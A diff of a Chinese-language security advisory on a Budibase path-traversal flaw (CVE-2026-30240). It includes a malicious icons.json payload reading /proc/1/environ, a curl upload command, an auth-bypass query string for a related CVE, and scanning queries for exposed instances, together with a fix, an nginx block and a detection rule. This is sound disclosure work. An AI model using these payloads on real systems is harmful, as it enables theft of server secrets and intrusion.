@@ -21,32 +21,32 @@ CVE-2026-30240 | CVSS 9.6（Critical）| 影响版本：Budibase <= 3.31.5
 Budibase 由 Budibase Ltd. 于 2019 年创立，是一款面向开发者和 IT 团队的开源低代码平台，用于快速构建内部管理工具、数据仪表盘和工作流自动化应用。平台支持连接 PostgreSQL、MySQL、MongoDB、REST API 等多种数据源，并支持 Docker、Kubernetes 等自托管方式及官方托管服务 Budibase Cloud。其 Progressive Web App（PWA）功能输出模块正是本次漏洞的所在位置。  
 ## 漏洞根因  
   
-漏洞位于服务端文件 packages/server/src/api/controllers/static/index.ts  
- 的 processPWAZip  
- 函数（第 181-256 行），对应 API 端点为：  
+漏洞位于服务端文件 packages/server/src/api/controllers/static/index.ts  
+ 的 processPWAZip  
+ 函数（第 181-256 行），对应 API 端点为：  
 ```
 POST /api/pwa/process-zip
 
 ```  
   
-该端点用于接收用户上传的 PWA ZIP 归档，服务端解压后读取其中的 icons.json  
- 文件，将其中每个图标的 src  
- 路径与临时解压目录（baseDir）拼接，再将文件内容上传至对象存储。问题出在路径拼接这一步：  
+该端点用于接收用户上传的 PWA ZIP 归档，服务端解压后读取其中的 icons.json  
+ 文件，将其中每个图标的 src  
+ 路径与临时解压目录（baseDir）拼接，再将文件内容上传至对象存储。问题出在路径拼接这一步：  
 ```
-const result = await objectStore.upload({
-  bucket: ObjectStoreBuckets.APPS,
-  filename: key,
-  path: join(baseDir, icon.src),  // icon.src 来自用户可控的 icons.json，未经过滤
-  type: mimeType,
+const result = await objectStore.upload({
+  bucket: ObjectStoreBuckets.APPS,
+  filename: key,
+  path: join(baseDir, icon.src),  // icon.src 来自用户可控的 icons.json，未经过滤
+  type: mimeType,
 })
 
 ```  
   
-Node.js 的 path.join()  
- 会直接处理 ../  
- 相对跳转，并不限制路径范围。代码未在拼接后验证最终路径是否仍位于 baseDir  
- 内，导致攻击者只需在 icon.src  
- 中填写路径穿越序列，即可使服务器读取任意文件：  
+Node.js 的 path.join()  
+ 会直接处理 ../  
+ 相对跳转，并不限制路径范围。代码未在拼接后验证最终路径是否仍位于 baseDir  
+ 内，导致攻击者只需在 icon.src  
+ 中填写路径穿越序列，即可使服务器读取任意文件：  
 ```
 path.join("/tmp/pwa-123", "../../../../proc/1/environ")
 // 解析结果：/proc/1/environ
@@ -56,17 +56,17 @@ path.join("/tmp/pwa-123", "../../../../proc/1/environ")
 简而言之，一个本应只读取 ZIP 包内图标文件的函数，因为缺少一行范围检查，变成了任意文件读取工具，且读取结果会自动通过对象存储提供给攻击者。  
 ## 攻击过程  
   
-攻击者首先构造一个包含恶意 icons.json  
- 的 ZIP 文件：  
+攻击者首先构造一个包含恶意 icons.json  
+ 的 ZIP 文件：  
 ```
 {
-  "icons": [
-    {
-      "src": "../../../../proc/1/environ",
-      "sizes": "192x192",
-      "type": "image/png"
-    }
-  ]
+  "icons": [
+    {
+      "src": "../../../../proc/1/environ",
+      "sizes": "192x192",
+      "type": "image/png"
+    }
+  ]
 }
 
 ```  
@@ -74,8 +74,8 @@ path.join("/tmp/pwa-123", "../../../../proc/1/environ")
 随后以 builder 身份将该 ZIP 上传到目标实例：  
 ```
 curl -X POST https://target.budibase.app/api/pwa/process-zip \
-  -H "Authorization: Bearer <builder_token>" \
-  -F "file=@payload.zip"
+  -H "Authorization: Bearer <builder_token>" \
+  -F "file=@payload.zip"
 
 ```  
   
@@ -106,9 +106,9 @@ curl -X POST https://target.budibase.app/api/pwa/process-zip \
 本次同日披露的还有另外两个 Budibase 漏洞，均由同一研究团队发现：  
   
 CVE-2026-31816（CVSS 9.1，未授权 API 绕过）：authorized()  
- 中间件中 isWebhookEndpoint()  
- 函数使用了未锚定的正则匹配请求 URL，攻击者在任意请求后附加 ?/webhooks/trigger  
- 即可完全绕过认证、授权和 CSRF 检查，无需任何账号。  
+ 中间件中 isWebhookEndpoint()  
+ 函数使用了未锚定的正则匹配请求 URL，攻击者在任意请求后附加 ?/webhooks/trigger  
+ 即可完全绕过认证、授权和 CSRF 检查，无需任何账号。  
   
 CVE-2026-25737（CVSS 8.9，任意文件上传绕过）：客户端文件扩展名校验可被绕过，允许上传任意类型文件。  
   
@@ -118,27 +118,27 @@ CVE-2026-25737（CVSS 8.9，任意文件上传绕过）：客户端文件扩展�
 ## 漏洞时间线  
 <table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">日期</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-03-04</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">研究人员在 Budibase Cloud 生产环境完成实证测试，确认可提取 162 个环境变量</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-03-09</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">CVE-2026-30240、CVE-2026-31816、CVE-2026-25737 同日公开披露</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-03-09</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">官方 Advisory 发布时修复版本标注为 None，即披露时无可用补丁</span></section></td></tr></tbody></table>## 修复方案  
   
-安全的修复方式需要在 path.join()  
- 拼接路径后，验证最终路径是否仍在 baseDir  
- 范围内：  
+安全的修复方式需要在 path.join()  
+ 拼接路径后，验证最终路径是否仍在 baseDir  
+ 范围内：  
 ```
-const resolvedPath = path.resolve(baseDir, icon.src)
-const normalizedBase = path.resolve(baseDir) + path.sep
+const resolvedPath = path.resolve(baseDir, icon.src)
+const normalizedBase = path.resolve(baseDir) + path.sep
 
-if (!resolvedPath.startsWith(normalizedBase)) {
-  throw new Error("Path traversal detected: icon src is outside of base directory")
+if (!resolvedPath.startsWith(normalizedBase)) {
+  throw new Error("Path traversal detected: icon src is outside of base directory")
 }
 
 ```  
   
-根本原则是：任何涉及用户可控路径输入的场景，都不应直接使用 path.join()  
-，而应结合 path.resolve()  
- 和路径前缀验证，确保最终访问路径不超出预期范围。  
+根本原则是：任何涉及用户可控路径输入的场景，都不应直接使用 path.join()  
+，而应结合 path.resolve()  
+ 和路径前缀验证，确保最终访问路径不超出预期范围。  
 ## 受影响资产排查  
   
 可通过以下资产测绘平台语法定位全球暴露的 Budibase 实例：  
 - FOFA：app="Budibase"  
- 或 title="Budibase"  
+ 或 title="Budibase"  
   
 - ZoomEye：app:"Budibase"  
   
@@ -151,14 +151,14 @@ if (!resolvedPath.startsWith(normalizedBase)) {
   
 第一，立即升级 Budibase 至已修复版本（3.31.8 或更高）。  
   
-第二，若无法立即升级，在反向代理或 WAF 层屏蔽 /api/pwa/process-zip  
- 端点对外网的访问：  
+第二，若无法立即升级，在反向代理或 WAF 层屏蔽 /api/pwa/process-zip  
+ 端点对外网的访问：  
 ```
 location /api/pwa/process-zip {
-    allow 10.0.0.0/8;
-    allow 172.16.0.0/12;
-    allow 192.168.0.0/16;
-    deny all;
+    allow 10.0.0.0/8;
+    allow 172.16.0.0/12;
+    allow 192.168.0.0/16;
+    deny all;
 }
 
 ```  
@@ -167,18 +167,18 @@ location /api/pwa/process-zip {
   
 第四，审查 builder 权限账号列表，移除不必要的账号，收紧账号邀请策略。  
   
-第五，在 SIEM 或 IDS 平台上部署以下检测规则，监测 POST 方法访问 /api/pwa/process-zip  
- 且上传内容包含 ../  
- 路径序列的请求：  
+第五，在 SIEM 或 IDS 平台上部署以下检测规则，监测 POST 方法访问 /api/pwa/process-zip  
+ 且上传内容包含 ../  
+ 路径序列的请求：  
 ```
 alert http any any -> $HTTP_SERVERS any (
-  msg:"CVE-2026-30240 Budibase PWA ZIP Path Traversal Attempt";
-  flow:established,to_server;
-  http.method; content:"POST";
-  http.uri; content:"/api/pwa/process-zip";
-  file.data; content:"..";
-  sid:2026302401;
-  rev:1;
+  msg:"CVE-2026-30240 Budibase PWA ZIP Path Traversal Attempt";
+  flow:established,to_server;
+  http.method; content:"POST";
+  http.uri; content:"/api/pwa/process-zip";
+  file.data; content:"..";
+  sid:2026302401;
+  rev:1;
 )
 
 ```  
